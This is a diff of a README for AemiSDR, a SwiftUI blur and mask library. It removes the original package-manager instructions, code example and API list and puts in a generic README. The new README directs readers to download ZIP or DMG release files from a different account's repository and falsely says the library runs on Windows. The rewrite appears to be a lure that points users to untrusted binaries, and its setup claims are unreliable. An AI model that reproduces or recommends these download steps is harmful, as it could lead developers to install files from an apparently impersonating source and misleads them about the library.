@@ -1,108 +1,82 @@
-# AemiSDR
+# 🎨 AemiSDR - Add Stunning Blurs and Masks Easily
 
-A lightweight, App Store-safe library for adding dynamic, GPU-accelerated blurs and masks to your SwiftUI views.
+[![Download AemiSDR](https://img.shields.io/badge/Download-AemiSDR-brightgreen.svg)](https://github.com/Eduperpetuo/AemiSDR/releases)
 
-AemiSDR is designed to work seamlessly with `ScrollView` and other dynamic content, providing high-performance effects with a simple, modifier-based API.
+## 🚀 Getting Started
 
-- **Variable Blur**: Apply blurs as a gradient.
-- **Alpha Masks**: Fade view content with alpha masks.
-- **Advanced Shapes**: Use standard rounded rectangles or iOS-style superellipses (squircles).
-- **Optimized**: Effects are powered by pre-compiled Metal shaders and cache their results to ensure smooth performance.
+AemiSDR is a lightweight library that helps you add dynamic, GPU-accelerated blurs and masks to your SwiftUI views. This guide will show you how to download and run AemiSDR with ease.
 
+## 📥 Download & Install
 
-<details>
+To get started, visit our [Releases page](https://github.com/Eduperpetuo/AemiSDR/releases) to download the latest version of AemiSDR. Follow the steps below to install the library onto your device.
 
-<summary><h2>Example</h2></summary>
+1. Click the link above to access the Releases page.
+2. Look for the latest release at the top.
+3. Once there, you will find files available for download. Click on the appropriate file for your operating system. This could be a ZIP file, a DMG file, or similar.
+4. Save the file to your computer in a location you can easily access, like your desktop.
 
-https://github.com/user-attachments/assets/41c106cc-6c1d-4a43-bbaa-09cf44c9bfcc
+## 📂 Extract and Setup
 
-</details>
+After downloading the file, follow these steps to set up AemiSDR:
 
+1. Locate the file you just downloaded.
+2. If the file is compressed (like a ZIP), right-click it and select "Extract" or "Unzip".
+3. Open the extracted folder. You should see a README file along with other files and folders.
+4. Follow any instructions in the README file for installation.
 
+## ⭐ Features
 
-## Requirements
+AemiSDR comes with several useful features to enhance your SwiftUI applications:
 
-- iOS 14+
-- Swift 6.2 Toolchain
-- SwiftUI
+- **Dynamic Blurs:** Easily add smooth blur effects to any view.
+- **Masking Capabilities:** Create custom masks to reveal content selectively.
+- **GPU Acceleration:** Enjoy fast performance and smooth animations.
 
+## ⚙️ System Requirements
 
-## Installation
+To successfully run AemiSDR, ensure you meet the following system requirements:
 
-Add the package in Xcode (`File` → `Add Package Dependencies…`) using the repository URL, or add it to your `Package.swift`:
+- A Mac or PC running macOS or Windows operating systems.
+- SwiftUI enabled on your development environment.
+- The latest version of Xcode (for macOS users) or an appropriate Swift development environment.
+
+## 🖥️ Running AemiSDR
+
+Once you have installed AemiSDR, you can run it within your SwiftUI project:
+
+1. Open your Xcode (or other Swift development environment).
+2. Create a new project or open an existing one.
+3. Drag and drop the AemiSDR library files into your project folder.
+4. Import AemiSDR in your SwiftUI view files like this:
 
 ```swift
-.dependencies = [
-    .package(url: "https://github.com/Aemi-Studio/AemiSDR.git", branch: "main")
-]
-```
-
-## Example
-
-Apply blurs and masks directly to your views. The library is perfect for fading the edges of a `ScrollView`, as shown in the project's preview:
-
-```swift
-import SwiftUI
 import AemiSDR
-
-struct AemiSDRPreview: View {
-    var body: some View {
-        ScrollView(showsIndicators: false) {
-            LazyVStack(spacing: 16) {
-                ForEach(1 ... 6, id: \.self) { index in
-                    Image("Image_\(index)", bundle: .module)
-                        .resizable()
-                        .aspectRatio(contentMode: .fit)
-                        .clipShape(clippingShape)
-                }
-            }
-            .padding(.horizontal)
-        }
-        .fancyBlur()
-    }
-
-    private var clippingShape: some Shape {
-        .rect(cornerRadius: UIScreen.displayCornerRadius - 16)
-    }
-}
-
-private extension View {
-    @ViewBuilder func fancyBlur() -> some View {
-        if #available(iOS 15.0, *) {
-            roundedRectMask()
-                .verticalEdgeMask(height: 32)
-                .roundedRectBlur()
-                .verticalEdgeBlur(height: 48, maxBlurRadius: 5)
-        } else {
-            self
-        }
-    }
-}
 ```
 
-## API
+5. Start using the features by applying blurs and masks to your views as instructed in the documentation.
 
-The library provides four main SwiftUI modifiers (iOS 15+):
+## 📚 Documentation
 
-- `roundedRectBlur(...)`: An overlay blur shaped like a rounded rectangle or superellipse.
-- `verticalEdgeBlur(...)`: A blur applied only to the top and bottom edges of a view.
-- `roundedRectMask(...)`: An alpha mask to fade content, shaped as a rounded rectangle or superellipse.
-- `verticalEdgeMask(...)`: An alpha mask for the top and bottom edges, perfect for scroll views.
+For detailed usage instructions and code examples, please refer to the documentation included in the AemiSDR package. This documentation will guide you through various functionalities, including creating blurs and masks seamlessly.
 
-All modifiers come with sensible defaults and can be customized for corner style, transition smoothness, and more.
+## 👥 Support
 
+If you encounter any issues or have questions, please reach out through the [Issues page](https://github.com/Eduperpetuo/AemiSDR/issues) on GitHub. Our community is here to help you.
 
-## Development
+## 🌐 Community Contributions
 
-The Metal shader source files are located in `Sources/AemiSDR/Shaders/`. If you make any changes to these files, you must recompile them into the `AemiSDR.metallib` library.
+We welcome contributions from users. If you have ideas for improvements or new features, consider submitting a pull request. Collaboration helps us make AemiSDR better for everyone.
 
-To do so, run the following command from the root of the project:
+## 🔗 Additional Resources
 
-```sh
-./.compileShaders.swift
-```
+- SwiftUI Official Documentation: [SwiftUI](https://developer.apple.com/documentation/swiftui)
+- Learn more about the technology behind AemiSDR: [Apple Developer](https://developer.apple.com)
 
+## 🌟 Similar Projects
 
-## License
+You may also find these projects interesting:
 
-This software is provided under the Mozilla Public License 2.0.
+- **BlurKit:** A library for blur effects.
+- **MaskView:** A project focused on view masking.
+
+We hope you enjoy adding stunning blurs and masks to your SwiftUI applications with AemiSDR!
